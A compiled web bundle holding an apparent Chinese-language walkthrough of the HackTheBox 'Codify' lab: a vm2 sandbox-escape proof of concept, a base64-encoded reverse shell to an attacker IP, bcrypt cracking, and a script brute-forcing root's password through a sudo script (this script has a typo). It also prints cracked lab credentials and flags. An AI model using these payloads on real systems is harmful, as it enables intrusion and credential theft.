"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6773],{12080:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>d});var r=s(85893),t=s(11151);const a={},c="Codify",i={id:"HackTheBox/Machines/Codify/index",title:"Codify",description:"Difficulty: Easy",source:"@site/docs/HackTheBox/Machines/Codify/index.md",sourceDirName:"HackTheBox/Machines/Codify",slug:"/HackTheBox/Machines/Codify/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Codify/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Codify/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Bizness",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/"},next:{title:"Crafty",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Crafty/"}},o={},d=[{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1 Port-80",id:"web-\u670d\u52a1-port-80",level:2},{value:"\u6c99\u76d2\u9003\u9038",id:"\u6c99\u76d2\u9003\u9038",level:3},{value:"User - svc",id:"user---svc",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - joshua",id:"user---joshua",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-1",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function l(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,t.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"codify",children:"Codify"})}),"\n",(0,r.jsxs)(n.admonition,{type:"info",children:[(0,r.jsx)(n.p,{children:"Difficulty: Easy"}),(0,r.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.239"',children:"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)\n|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)\n80/tcp   open  http    Apache httpd 2.4.52\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Did not follow redirect to http://codify.htb/\n3000/tcp open  http    Node.js Express framework\n|_http-title: Codify\n"})}),"\n",(0,r.jsx)(n.h2,{id:"web-\u670d\u52a1-port-80",children:"web \u670d\u52a1 Port-80"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'HTTP/1.1 301 Moved Permanently\nConnection: Keep-Alive\nContent-Length: 304\nContent-Type: text/html; charset=iso-8859-1\nDate: Thu, 14 Mar 2024 02:25:13 GMT\nKeep-Alive: timeout=5, max=100\nLocation: http://codify.htb/\nServer: Apache/2.4.52 (Ubuntu)\n\n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>301 Moved Permanently</title>\n</head><body>\n<h1>Moved Permanently</h1>\n<p>The document has moved <a href="http://codify.htb/">here</a>.</p>\n<hr>\n<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80</address>\n</body></html>\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"/etc/hosts"})," \u6587\u4ef6\u4e2d\u6dfb\u52a0\u89e3\u6790\u8bb0\u5f55\u4e4b\u540e\uff0c\u5c1d\u8bd5\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"http://codify.htb/"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(74701).Z+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7531\u6b64\u770b\u6765\uff0c",(0,r.jsx)(n.code,{children:"80"})," \u7aef\u53e3\u548c ",(0,r.jsx)(n.code,{children:"3000"})," \u7aef\u53e3\u7684\u8fd4\u56de\u670d\u52a1\u662f\u4e00\u81f4\u7684"]}),"\n",(0,r.jsx)(n.h3,{id:"\u6c99\u76d2\u9003\u9038",children:"\u6c99\u76d2\u9003\u9038"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"http://codify.htb/limitations"})," \u4e2d\uff0c\u53ef\u4ee5\u5f97\u5230\u6c99\u76d2\u4e2d\u5bf9\u4e8e\u51fd\u6570\u8c03\u7528\u7684\u4e00\u4e9b\u9650\u5236"]}),"\n",(0,r.jsxs)(n.p,{children:["\u67e5\u9605\u76f8\u5173\u8d44\u6599\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u8fd9\u4e2a\u6f0f\u6d1e ",(0,r.jsx)(n.a,{href:"https://github.com/advisories/GHSA-ch3r-j5x3-6q2m",children:"CVE-2023-30547"})]}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u4ee5\u4e0b poc \u8fdb\u884c\u653b\u51fb"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const {VM} = require(\"vm2\");\nconst vm = new VM();\n\nconst code = `\ncmd = 'id'\nerr = {};\nconst handler = {\n    getPrototypeOf(target) {\n        (function stack() {\n            new Error().stack;\n            stack();\n        })();\n    }\n};\n\nconst proxiedErr = new Proxy(err, handler);\ntry {\n    throw proxiedErr;\n} catch ({constructor: c}) {\n    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);\n}\n`\nconsole.log(vm.run(code));\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528\u5e38\u7528\u7684 bash \u7b26\u53f7"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(62068).Z+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"cmd = 'echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjIiLDk5OTkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(89795).Z+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.h2,{id:"user---svc",children:"User - svc"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[10:36:41] Welcome to pwncat \ud83d\udc08!\n[10:37:04] received connection from 10.10.11.239:35458\n[10:37:13] 10.10.11.239:35458: registered new host w/ db\n(local) pwncat$ back\n(remote) svc@codify:/home/svc$ whoami\nsvc\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsxs)(n.p,{children:["\u53d1\u73b0\u4e00\u4e2a\u6570\u636e\u5e93\u6587\u4ef6 ",(0,r.jsx)(n.code,{children:"/var/www/contact/tickets.db"})]}),"\n",(0,r.jsx)(n.p,{children:"\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u5bf9\u6570\u636e\u5e93\u4fe1\u606f\u8fdb\u884c\u8bfb\u53d6"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"id"}),(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"username"}),(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"password"})]})}),(0,r.jsx)(n.tbody,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"3"}),(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"joshua"}),(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2"})]})})]}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u54c8\u5e0c\u6570\u636e\u8fdb\u884c\u7206\u7834"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ hashid hash.txt\n--File 'hash.txt'--\nAnalyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'\n[+] Blowfish(OpenBSD)\n[+] Woltlab Burning Board 4.x\n[+] bcrypt\n--End of file 'hash.txt'--\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nspongebob1       (?)\n......\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u51ed\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"joshua:spongebob1\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---joshua",children:"User - joshua"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs joshua@10.10.11.239\n[10:52:20] Welcome to pwncat \ud83d\udc08!\nPassword: **********\n[10:52:35] 10.10.11.239:22: registered new host w/ db\n(local) pwncat$ back\n(remote) joshua@codify:/home/joshua$ whoami\njoshua\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) joshua@codify:/home/joshua$ cat user.txt\na32a183123439045d5ea11c8c79e6649\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-1",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for joshua on codify:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser joshua may run the following commands on codify:\n    (root) /opt/scripts/mysql-backup.sh\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u811a\u672c\u5185\u5bb9"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'#!/bin/bash\nDB_USER="root"\nDB_PASS=$(/usr/bin/cat /root/.creds)\nBACKUP_DIR="/var/backups/mysql"\n\nread -s -p "Enter MySQL password for $DB_USER:" USER_PASS\n/usr/bin/echo\n\nif [[$DB_PASS == $USER_PASS]]; then\n        /usr/bin/echo "Password confirmed!"\nelse\n        /usr/bin/echo "Password confirmation failed!"\n        exit 1\nfi\n\n/usr/bin/mkdir -p "$BACKUP_DIR"\n\ndatabases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")\n\nfor db in $databases; do\n    /usr/bin/echo "Backing up database: $db"\n    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"\ndone\n\n/usr/bin/echo "All databases backed up successfully!"\n/usr/bin/echo "Changing the permissions"\n/usr/bin/chown root:sys-adm "$BACKUP_DIR"\n/usr/bin/chmod 774 -R "$BACKUP_DIR"\n/usr/bin/echo \'Done!\'\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u770b\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'if [[$DB_PASS == $USER_PASS]]; then\n        /usr/bin/echo "Password confirmed!"\nelse\n        /usr/bin/echo "Password confirmation failed!"\n        exit 1\nfi\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48\u53ef\u4ee5\u5c1d\u8bd5\u5bf9 ",(0,r.jsx)(n.code,{children:"$DB_PASS"})," \u53d8\u91cf\u8fdb\u884c\u7206\u7834\uff0c\u4e5f\u5c31\u662f\u8bfb\u53d6 ",(0,r.jsx)(n.code,{children:"/root/.creds"})," \u6587\u4ef6\u7684\u5185\u5bb9"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import string\nimport subproccess\n\ndef check_password(p):\n    command = f"echo\'{p}*\'| sudo /opt/scripts/mysql-backup.sh"\n    result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)\n    return "Password confirmed!" in result.stdout\n\ncharset = string.ascii_letters + string.digits\npassword = ""\nis_password_found = False\n\nwhile not is_password_found:\n    for char in charset:\n        if check_password(password + char):\n            password += char\n            print(password)\n            break\n    else:\n        is_password_found = True\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u6267\u884c\u540e\u5f97\u5230\u5bc6\u7801 ",(0,r.jsx)(n.code,{children:"kljh12k3jhaskjh12kjh3"})]}),"\n",(0,r.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) joshua@codify:/home/joshua$ su root\nPassword:\nroot@codify:/home/joshua# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"root@codify:~# cat root.txt\nf2138d1d7e9e92e46c08a57ad2c6754f\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},74701:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/images/image_20240328-102824-02c8929839fcfe753e581dfe249f5a7c.png"},62068:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/images/image_20240336-103626-0ba6165dbb513fe0cd3e3a3f93ca22d0.png"},89795:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/images/image_20240337-103727-baaaf5a268fe8fd4cd4ef5d86ff29b28.png"},11151:(e,n,s)=>{s.d(n,{Z:()=>i,a:()=>c});var r=s(67294);const t={},a=r.createContext(t);function c(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);